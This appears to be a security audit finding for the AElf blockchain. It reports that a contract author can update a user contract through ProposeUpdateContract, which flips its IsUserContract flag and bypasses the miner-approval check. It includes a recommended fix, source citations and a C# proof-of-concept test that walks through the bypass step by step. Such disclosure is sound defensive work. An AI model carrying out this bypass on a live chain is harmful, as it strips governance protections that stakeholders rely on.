# Audit Report

## Title
User Contract Authorization Bypass via isUserContract Flag Manipulation During Updates

## Summary
Contract authors can bypass the stricter miner-based authorization model for user contracts by updating them through `ProposeUpdateContract` instead of `UpdateUserSmartContract`. This permanently flips the `isUserContract` flag from `true` to `false`, allowing future updates to bypass the `AssertCurrentMiner()` requirement and use Parliament governance instead.

## Finding Description

User contracts in AElf are designed with a stricter authorization model requiring miner approval for updates. However, a critical flaw in the contract update flow allows authors to bypass this protection.

When a contract author calls `ProposeUpdateContract` on a user contract, the method only validates author permission but does not enforce that user contracts must use the dedicated `UpdateUserSmartContract` path. [1](#0-0) 

The proposal creation preserves the `IsSystemContract` flag but completely omits preservation of the `isUserContract` flag, and routes to `UpdateSmartContract` for execution. [2](#0-1) 

When `UpdateSmartContract` executes, it hardcodes the `isUserContract` parameter to `false` regardless of the original contract type. [3](#0-2) 

The private helper method then unconditionally overwrites the contract's `IsUserContract` flag with the provided value. [4](#0-3) 

This breaks the security guarantee that user contracts require miner authorization. User contract updates should go through `ReleaseApprovedUserSmartContract`, which enforces `AssertCurrentMiner()`. [5](#0-4) 

Once the flag is flipped, subsequent updates use `ReleaseCodeCheckedContract`, which only validates the proposer identity without requiring miner approval. [6](#0-5) 

## Impact Explanation

This vulnerability has **High** severity impact because it:

1. **Permanently alters authorization requirements**: Once exploited, the contract permanently loses its miner-based protection, fundamentally changing its security model
2. **Violates protocol invariants**: Contract types (system/user/regular) should be immutable once deployed, but this allows mutation
3. **Affects governance integrity**: Users and stakeholders who deployed contracts expecting miner oversight lose that protection
4. **No reversion mechanism**: There is no legitimate way to restore the `isUserContract` flag once changed

The attack allows contract authors to unilaterally downgrade their contract's security guarantees from requiring current miner approval to only requiring Parliament governance approval.

## Likelihood Explanation

The likelihood is **High** because:

1. **Low attack complexity**: The attacker simply calls `ProposeUpdateContract` instead of `UpdateUserSmartContract` - both are public methods
2. **Minimal prerequisites**: The attacker only needs to be the contract author (obtainable by deploying a user contract) and obtain standard Parliament approval
3. **No detection mechanisms**: The flag change happens silently in state without emitting distinguishing events
4. **Standard governance process**: The approval requirements are identical to legitimate contract updates, making malicious updates indistinguishable

Any motivated contract author can execute this attack with only the cost of obtaining Parliament approval, which is the standard governance process for contract updates.

## Recommendation

Add validation in `ProposeUpdateContract` to prevent user contracts from using this path:

```csharp
public override Hash ProposeUpdateContract(ContractUpdateInput input)
{
    var proposedContractInputHash = CalculateHashFromInput(input);
    RegisterContractProposingData(proposedContractInputHash);

    var contractAddress = input.Address;
    var info = State.ContractInfos[contractAddress];
    Assert(info != null, "Contract not found.");
    
    // Add this check to prevent user contracts from using this path
    Assert(!info.IsUserContract, "User contracts must use UpdateUserSmartContract.");
    
    AssertAuthorityByContractInfo(info, Context.Sender);
    // ... rest of the method
}
```

Additionally, preserve the `IsUserContract` flag in `ContractCodeCheckInput` message structure and ensure it is passed through the proposal flow, similar to how `IsSystemContract` is handled.

## Proof of Concept

```csharp
[Fact]
public async Task UserContractAuthorizationBypass_Test()
{
    StartSideChain("ELF");
    await AddZeroContractToProposerWhiteListAsync();
    
    // Step 1: Deploy a user contract
    var userContractCode = Codes.Single(kv => kv.Key.Contains("TokenConverter")).Value;
    var deployInput = new UserContractDeploymentInput
    {
        Category = KernelConstants.DefaultRunnerCategory,
        Code = ByteString.CopyFrom(userContractCode)
    };
    
    var deployResult = await SideChainTester.ExecuteContractWithMiningAsync(
        SideBasicContractZeroAddress,
        nameof(ACS0Container.ACS0Stub.DeployUserSmartContract),
        deployInput);
    
    var codeHash = DeployUserSmartContractOutput.Parser.ParseFrom(deployResult.ReturnValue).CodeHash;
    var proposalId = ProposalCreated.Parser
        .ParseFrom(deployResult.Logs.First(l => l.Name.Contains(nameof(ProposalCreated))).NonIndexed)
        .ProposalId;
    var proposedHash = CodeCheckRequired.Parser
        .ParseFrom(deployResult.Logs.First(l => l.Name.Contains(nameof(CodeCheckRequired))).NonIndexed)
        .ProposedContractInputHash;
    
    await ApproveWithMinersAsync(SideChainTester, SideParliamentAddress, proposalId);
    
    // Release with miner
    var releaseResult = await SideChainMinerTester.ExecuteContractWithMiningAsync(
        SideBasicContractZeroAddress,
        nameof(ACS0Container.ACS0Stub.ReleaseApprovedUserSmartContract),
        new ReleaseContractInput { ProposalId = proposalId, ProposedContractInputHash = proposedHash });
    
    var contractAddress = ContractDeployed.Parser
        .ParseFrom(releaseResult.Logs.First(l => l.Name.Contains(nameof(ContractDeployed))).NonIndexed)
        .Address;
    
    // Verify it's a user contract
    var info1 = await SideChainTester.CallContractMethodAsync(
        SideBasicContractZeroAddress,
        nameof(ACS0Container.ACS0Stub.GetContractInfo),
        contractAddress);
    var contractInfo1 = ContractInfo.Parser.ParseFrom(info1);
    contractInfo1.IsUserContract.ShouldBeTrue(); // Initially true
    
    // Step 2: Use ProposeUpdateContract instead of UpdateUserSmartContract
    var updateCode = Codes.Single(kv => kv.Key.Contains("TokenHolder")).Value;
    var updateInput = new ContractUpdateInput
    {
        Address = contractAddress,
        Code = ByteString.CopyFrom(updateCode)
    };
    
    var updateResult = await SideChainTester.ExecuteContractWithMiningAsync(
        SideBasicContractZeroAddress,
        nameof(ACS0Container.ACS0Stub.ProposeUpdateContract),
        updateInput);
    
    // Complete the update proposal flow
    proposalId = ProposalCreated.Parser
        .ParseFrom(updateResult.Logs.First(l => l.Name.Contains(nameof(ProposalCreated))).NonIndexed)
        .ProposalId;
    proposedHash = ContractProposed.Parser
        .ParseFrom(updateResult.Logs.First(l => l.Name.Contains(nameof(ContractProposed))).NonIndexed)
        .ProposedContractInputHash;
    
    await ApproveWithMinersAsync(SideChainTester, SideParliamentAddress, proposalId);
    
    await SideChainTester.ExecuteContractWithMiningAsync(
        SideBasicContractZeroAddress,
        nameof(ACS0Container.ACS0Stub.ReleaseApprovedContract),
        new ReleaseContractInput { ProposalId = proposalId, ProposedContractInputHash = proposedHash });
    
    var codeCheckProposalId = ProposalCreated.Parser
        .ParseFrom(updateResult.Logs.First(l => l.Name.Contains(nameof(ProposalCreated))).NonIndexed)
        .ProposalId;
    
    await ApproveWithMinersAsync(SideChainTester, SideParliamentAddress, codeCheckProposalId);
    
    await SideChainTester.ExecuteContractWithMiningAsync(
        SideBasicContractZeroAddress,
        nameof(ACS0Container.ACS0Stub.ReleaseCodeCheckedContract),
        new ReleaseContractInput { ProposalId = codeCheckProposalId, ProposedContractInputHash = proposedHash });
    
    // Step 3: Verify the IsUserContract flag has been flipped to false
    var info2 = await SideChainTester.CallContractMethodAsync(
        SideBasicContractZeroAddress,
        nameof(ACS0Container.ACS0Stub.GetContractInfo),
        contractAddress);
    var contractInfo2 = ContractInfo.Parser.ParseFrom(info2);
    contractInfo2.IsUserContract.ShouldBeFalse(); // Now false - authorization bypass achieved!
}
```

## Notes

The vulnerability exists because `ProposeUpdateContract` lacks validation to prevent user contracts from using this update path. The `ContractCodeCheckInput` protobuf message definition only includes `is_system_contract` but not `is_user_contract`, which would be needed to preserve this flag through the proposal flow. [7](#0-6) 

In contrast, the `CodeCheckRequired` event includes both flags, showing the system is aware of this distinction but fails to enforce it during updates. [8](#0-7)

### Citations

**File:** contract/AElf.Contracts.Genesis/BasicContractZero.cs (L175-183)
```csharp
    public override Hash ProposeUpdateContract(ContractUpdateInput input)
    {
        var proposedContractInputHash = CalculateHashFromInput(input);
        RegisterContractProposingData(proposedContractInputHash);

        var contractAddress = input.Address;
        var info = State.ContractInfos[contractAddress];
        Assert(info != null, "Contract not found.");
        AssertAuthorityByContractInfo(info, Context.Sender);
```

**File:** contract/AElf.Contracts.Genesis/BasicContractZero.cs (L209-215)
```csharp
                Params = new ContractCodeCheckInput
                {
                    ContractInput = input.ToByteString(),
                    CodeCheckReleaseMethod = nameof(UpdateSmartContract),
                    ProposedContractInputHash = proposedContractInputHash,
                    Category = info.Category,
                    IsSystemContract = info.IsSystemContract
```

**File:** contract/AElf.Contracts.Genesis/BasicContractZero.cs (L292-306)
```csharp
    public override Empty ReleaseCodeCheckedContract(ReleaseContractInput input)
    {
        var contractProposingInput = State.ContractProposingInputMap[input.ProposedContractInputHash];

        Assert(
            contractProposingInput != null &&
            contractProposingInput.Status == ContractProposingInputStatus.CodeCheckProposed &&
            contractProposingInput.Proposer == Context.Sender, "Invalid contract proposing status.");
        contractProposingInput.Status = ContractProposingInputStatus.CodeChecked;
        State.ContractProposingInputMap[input.ProposedContractInputHash] = contractProposingInput;
        var codeCheckController = State.CodeCheckController.Value;
        Context.SendInline(codeCheckController.ContractAddress,
            nameof(AuthorizationContractContainer.AuthorizationContractReferenceState.Release), input.ProposalId);
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Genesis/BasicContractZero.cs (L324-336)
```csharp
    public override Address UpdateSmartContract(ContractUpdateInput input)
    {
        var contractAddress = input.Address;
        var info = State.ContractInfos[contractAddress];
        RequireSenderAuthority(State.CodeCheckController.Value?.OwnerAddress);
        var inputHash = CalculateHashFromInput(input);

        if (!TryClearContractProposingData(inputHash, out _))
            Assert(Context.Sender == info.Author, "No permission.");

        UpdateSmartContract(contractAddress, input.Code.ToByteArray(), info.Author, false);

        return contractAddress;
```

**File:** contract/AElf.Contracts.Genesis/BasicContractZero.cs (L476-493)
```csharp
    public override Empty ReleaseApprovedUserSmartContract(ReleaseContractInput input)
    {
        var contractProposingInput = State.ContractProposingInputMap[input.ProposedContractInputHash];

        Assert(
            contractProposingInput != null &&
            contractProposingInput.Status == ContractProposingInputStatus.CodeCheckProposed &&
            contractProposingInput.Proposer == Context.Self, "Invalid contract proposing status.");

        AssertCurrentMiner();

        contractProposingInput.Status = ContractProposingInputStatus.CodeChecked;
        State.ContractProposingInputMap[input.ProposedContractInputHash] = contractProposingInput;
        var codeCheckController = State.CodeCheckController.Value;
        Context.SendInline(codeCheckController.ContractAddress,
            nameof(AuthorizationContractContainer.AuthorizationContractReferenceState.Release), input.ProposalId);
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Genesis/BasicContractZero_Helper.cs (L98-122)
```csharp
    private void UpdateSmartContract(Address contractAddress, byte[] code, Address author, bool isUserContract)
    {
        var info = State.ContractInfos[contractAddress];
        Assert(info != null, "Contract not found.");
        Assert(author == info.Author, "No permission.");

        var oldCodeHash = info.CodeHash;
        var newCodeHash = HashHelper.ComputeFrom(code);
        Assert(oldCodeHash != newCodeHash, "Code is not changed.");
        AssertContractNotExists(newCodeHash);

        info.CodeHash = newCodeHash;
        info.IsUserContract = isUserContract;
        info.Version++;

        var reg = new SmartContractRegistration
        {
            Category = info.Category,
            Code = ByteString.CopyFrom(code),
            CodeHash = newCodeHash,
            IsSystemContract = info.IsSystemContract,
            Version = info.Version,
            ContractAddress = contractAddress,
            IsUserContract = isUserContract
        };
```

**File:** protobuf/acs0.proto (L209-222)
```text
message ContractCodeCheckInput{
    // The byte array of the contract code to be checked.
    bytes contract_input = 1;
    // Whether the input contract is to be deployed or updated.
    bool is_contract_deployment = 2;
    // Method to call after code check complete(DeploySmartContract or UpdateSmartContract).
    string code_check_release_method = 3;
    // The id of the proposed contract.
    aelf.Hash proposed_contract_input_hash = 4;
    // The category of contract code(0: C#).
    sint32 category = 5;
    // Indicates if the contract is the system contract.
    bool is_system_contract = 6;
}
```

**File:** protobuf/acs0.proto (L248-261)
```text
message CodeCheckRequired
{
    option (aelf.is_event) = true;
    // The byte array of the contract code.
    bytes code = 1;
    // The id of the proposed contract.
    aelf.Hash proposed_contract_input_hash = 2;
    // The category of contract code(0: C#).
    sint32 category = 3;
    // Indicates if the contract is the system contract.
    bool is_system_contract = 4;
    // Indicates if the contract is the user contract.
    bool is_user_contract = 5;
}
```
